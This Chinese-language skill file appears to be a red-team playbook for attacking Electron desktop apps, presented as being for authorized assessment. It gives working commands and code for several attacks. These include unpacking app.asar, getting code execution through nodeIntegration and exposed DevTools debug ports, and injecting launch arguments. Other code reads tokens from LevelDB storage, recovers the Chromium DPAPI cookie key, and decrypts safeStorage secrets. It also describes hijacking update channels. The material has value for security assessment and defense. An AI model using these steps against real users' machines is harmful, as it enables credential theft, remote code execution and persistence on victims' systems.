---
name: electron-client
description: Electron 桌面客户端逆向与攻击。app.asar 提取、主进程/预加载脚本审计、contextIsolation 与 nodeIntegration 信任边界、调试端口利用、本地存储与 token 提取、safeStorage 加密解密、自动更新通道劫持。授权客户端安全评估使用。
tags: [electron, client, asar, thick-client, token, leveldb, redteam, reverse]
---

# Electron 客户端攻击

**判定纪律**：Electron 应用的「安全」不等于「没开 debug 端口」。真正的判定只有三条：**渲染进程能不能直接 require node 模块、预加载脚本暴露了哪些桥接方法、自动更新有没有签名校验**。前两条决定能不能 RCE，第三条决定能不能持久化。

## 一、定位与解包

```bash
# 定位（Windows）
#   %LOCALAPPDATA%/<AppName>/app-<version>/resources/app.asar
#   %PROGRAMFILES%/<AppName>/resources/app.asar
# macOS
#   /Applications/<App>.app/Contents/Resources/app.asar
# Linux
#   /opt/<app>/resources/app.asar  ~/.config/<app>/

# 判定是不是 Electron（不需要运行）
strings <binary> | grep -E 'Electron|chrome_\w+\.pak|resources/app\.asar'
ls resources/                    # app.asar 存在 = Electron

# 解包
npx asar extract app.asar unpacked/
npx asar list app.asar | head -50

# 有 app.asar.unpacked/ 说明部分 native 模块被外置（通常含 .node）
# 加密的 asar（asar integrity / 加壳）→ 先看 header
xxd -l 64 app.asar | head    # 正常以 04 00 00 00 开头（size pickle）
```

## 二、三个必读文件

| 文件 | 位置 | 看什么 |
|---|---|---|
| `package.json` | 解包根 | `main` 指向主进程；`version` 反查 Electron 版本 |
| 主进程 | `main.js` / `background.js` | `BrowserWindow` 的 `webPreferences` |
| 预加载 | `preload.js` | `contextBridge.exposeInMainWorld` 暴露了什么 |

```javascript
// 危险配置判定
new BrowserWindow({
  webPreferences: {
    nodeIntegration: true,        // 🔴 渲染进程可 require('child_process') = 直接 RCE
    contextIsolation: false,      // 🔴 渲染进程能改 window 上的对象 = 原型污染 + 桥接逃逸
    sandbox: false,               // 🟠 默认 false，配合上两条是致命的
    webSecurity: false,           // 🟠 关同源策略，可读任意本地文件
    allowRunningInsecureContent: true,
  }
})
```

**从「能 RCE」到「真的 RCE」的链路**：

```
nodeIntegration: true
  → 页面内任意 JS 执行 via XSS / 加载的远程内容 / 用户可控 HTML
  → require('child_process').exec('calc')
  → 本地代码执行
```

如果 `contextIsolation: false` 但 `nodeIntegration: false`，攻击面变成**原型污染预加载桥**：污染 `Object.prototype`，等主进程的 IPC handler 读取被污染的属性。

## 三、调试端口（最容易被忽略的入口）

```bash
# 探测
ss -tlnp | grep -E '9222|9229'
curl -s http://127.0.0.1:9222/json/list | jq '.[].title,.[].webSocketDebuggerUrl'

# 拿到 ws 地址后，可直接在渲染进程执行
# DevTools Protocol:
#   Runtime.evaluate  → 任意 JS
#   若 contextIsolation=false，直接 window.require('child_process')
```

被 `--inspect` 开在主进程（9229）时更狠：**可以直接在 Node 上下文执行**。

**启动参数注入**（本地提权/横向）：
```bash
# 用户在桌面快捷方式 / 系统服务里带 --remote-debugging-port 的不多，
# 但很多应用把参数交给 single-instance lock 转发，可被二次启动注入
<App>.exe --remote-debugging-port=9222 --inspect=9229
```

## 四、本地数据

| 位置 | 内容 | 加密 |
|---|---|---|
| `Local Storage/leveldb/` | 普通 key-value（含 token 明文的情况很常见） | 无 |
| `IndexedDB/*.leveldb/` | 结构化数据、离线缓存 | 无 |
| `Cookies`（SQLite） | 会话 cookie | Windows 上值被 DPAPI 加密 |
| `Local State` | `os_crypt.encrypted_key` | DPAPI / Keychain |
| `Preferences` | 窗口状态、账号列表 | 无 |

```bash
# leveldb 直读（key 常有前缀）
pip install plyvel
python3 -c "
import plyvel
db = plyvel.DB('Local Storage/leveldb', create_if_missing=False)
for k,v in db:
    print(k[:60], v[:200])
"

# Chromium cookie 解密（Windows）
#   AES-256-GCM，key 在 Local State 的 os_crypt.encrypted_key
#   取 encrypted_key → base64 解码 → 去掉 'DPAPI' 前缀 → CryptUnprotectData → AES key
python3 -c "
import base64, json, win32crypt
from Crypto.Cipher import AES
ls = json.load(open('Local State'))
key = win32crypt.CryptUnprotectData(base64.b64decode(ls['os_crypt']['encrypted_key'])[5:], None, None, None, 0)[1]
print(key.hex())
"
```

**safeStorage（Electron 自带的加密）**：

```javascript
// 主进程代码里出现即说明用了 safeStorage
safeStorage.encryptString(token)   // Windows→DPAPI, macOS→Keychain, Linux→kwallet/gnome-libsecret
safeStorage.decryptString(buf)
```

`safeStorage` 的安全性完全取决于**谁能在同一用户会话里跑代码**。拿到任意代码执行后：

```javascript
// 在被审计应用自己的上下文里解密（最省事的方式）
const { safeStorage } = require('electron');
console.log(safeStorage.decryptString(Buffer.from(blob, 'base64')));
```

Linux 上若无 keyring，`safeStorage` 会退化到 `basic_text`（明文+固定前缀），`Local State` 里能看到 `"os_crypt":{"audit_enabled":...}` 且无 `encrypted_key`。

## 五、自动更新通道

| 机制 | 文件 | 攻击面 |
|---|---|---|
| electron-updater | `app-update.yml` / `dev-app-update.yml` | 更新源 URL 可改 → 投毒 |
| Squirrel | `RELEASES` 文件 | 无签名校验 = 任意包 |
| 自研 | 主进程里的 `downloadFile()` + `exec` | 看有没有 hash/签名校验 |

```bash
cat resources/app-update.yml
# provider: generic
# url: https://updates.example.com/    ← 可被 DNS/代理劫持
```

判定：**更新包有没有代码签名校验**。`electron-updater` 默认校验 `sha512`，但 `sha512` 来自**同一个被劫持的服务器**——所以真正的问题是传输层和签名公钥是否硬编码在客户端里。

## 六、常见误判

| 现象 | 误解 | 实际 |
|---|---|---|
| 没有 `app.asar` | 不是 Electron | 可能用了 `asar: false` 打包或 webpack 打包进单文件 |
| `nodeIntegration: true` 但打不出 RCE | 有别的限制 | 检查 `sandbox: true` 会覆盖 nodeIntegration |
| leveldb 读不出明文 | 加密了 | Electron 的 LocalStorage 不加密，可能你看错了 profile 目录 |
| `safeStorage` 拿到密文解不开 | 密钥错 | 必须在**同一用户会话**解密；跨用户 DPAPI 必失败 |
| 调试端口打不开 | 没有 | 可能只监听 127.0.0.1 且需要 `--remote-allow-origins` |

## 七、取证/评估清单

1. `webPreferences` 四项（nodeIntegration / contextIsolation / sandbox / webSecurity）
2. `preload.js` 的 `exposeInMainWorld` 暴露面 — 有没有 `exec` / `openPath` / `shell` 类能力直通
3. 加载的远程内容（`loadURL` 的域名）是否可被 MITM / 域名劫持
4. `app-update.yml` 的更新源与签名校验
5. 本地存储里有没有长期 token（比密码更危险）
6. 是否启动 `--inspect` / `--remote-debugging-port`
